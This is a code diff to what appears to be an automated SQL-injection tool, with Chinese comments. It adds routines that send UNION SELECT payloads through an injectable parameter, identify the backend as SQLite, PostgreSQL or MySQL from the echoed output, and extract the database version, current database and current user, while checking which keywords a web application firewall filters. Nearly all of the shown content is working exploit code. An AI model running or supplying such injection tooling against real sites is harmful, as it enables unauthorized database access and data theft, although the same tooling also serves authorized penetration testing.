@@ -80,9 +80,9 @@ class Fingerprinter:
             if fp.widebyte:
                 notes.append("宽字节注入可行（%df 吞掉转义反斜杠）")
 
-        # 版本 / 当前库（快速通道：union 回显 > 报错）
+        # DBMS 识别 + 版本 / 当前库（快速通道：union 回显 > 报错）
         if fp.echo_visible and not waf.is_filtered("union", "select"):
-            self._version_via_union(fp)
+            self._identify_dbms_via_union(fp)
         elif fp.error_visible and not waf.is_filtered("updatexml", "extractvalue"):
             self._version_via_error(fp, waf)
 
@@ -92,6 +92,53 @@ class Fingerprinter:
         return fp
 
     # ------------------------------------------------------------------
+    def _union_echo(self, expr: str):
+        """把标量表达式放到回显位并发送，返回响应体。"""
+        from ..tampers import form_sep
+        n = self.inj.column_count or 2
+        cols = ["null"] * n
+        pos = (self.inj.echo_positions or [1])[0] - 1
+        cols[pos] = expr
+        core = apply_form("union select " + ",".join(cols), self.inj.form)
+        pre = f"0{self.inj.closure}"
+        if not self.inj.closure:
+            pre += form_sep(self.inj.form) if self.inj.form != "classic" else " "
+        r = self.s.request_value(f"{pre}{core}{self.inj.comment}")
+        self._last_union_payload = f"{pre}{core}{self.inj.comment}"
+        return r.body
+
+    def _identify_dbms_via_union(self, fp: Fingerprint):
+        """用 union 回显识别 DBMS：sqlite_version / version(PostgreSQL 字样) / version。"""
+        body = self._union_echo("sqlite_version()")
+        m = re.search(r"(3\.[0-9]+[0-9.]*[0-9])", body)
+        # 注：识别 payload 由 _union_echo 统一记录
+        if m and "sqlite" not in body.lower().split("3.")[0][:20]:
+            # sqlite_version() 返回纯数字版本（如 3.44.2）
+            fp.dbms, fp.version = "SQLite", m.group(1)
+            self.log("INFO", f"[指纹] 识别 DBMS: SQLite {fp.version}")
+            self.s.record_step("识别 DBMS：SQLite", self._last_union_payload,
+                               "SQLite 用 sqlite_master（无 information_schema），"
+                               "# 不是注释符、无 ascii()/sleep()")
+            return
+        body = self._union_echo("version()")
+        if "postgres" in body.lower():
+            fp.dbms = "PostgreSQL"
+            mver = re.search(r"([0-9]+\.[0-9]+(\.[0-9]+)?)", body)
+            fp.version = mver.group(1) if mver else ""
+            self.log("INFO", f"[指纹] 识别 DBMS: PostgreSQL {fp.version}")
+            self.s.record_step("识别 DBMS：PostgreSQL", self._last_union_payload,
+                               "PG：|| 为字符串拼接，group_concat 需换 string_agg")
+            return
+        # 默认 MySQL：版本/库/用户一并取回
+        body = self._union_echo("concat_ws(0x7e,version(),database(),user())")
+        m = re.search(r"([0-9]+\.[0-9]+\.[0-9]+[^~\s<]*)~([^~\s<]+)~([^~\s<]+)", body)
+        if m:
+            fp.version, fp.current_db, fp.current_user = m.groups()
+        fp.dbms = "MySQL"
+        self.log("INFO", f"[指纹] 识别 DBMS: MySQL {fp.version}")
+        self.s.record_step("识别 DBMS：MySQL", self._last_union_payload,
+                           "version()/database()/user() 均可用")
+
     def _version_via_union(self, fp: Fingerprint):
         from ..tampers import form_sep
         n = self.inj.column_count or 2
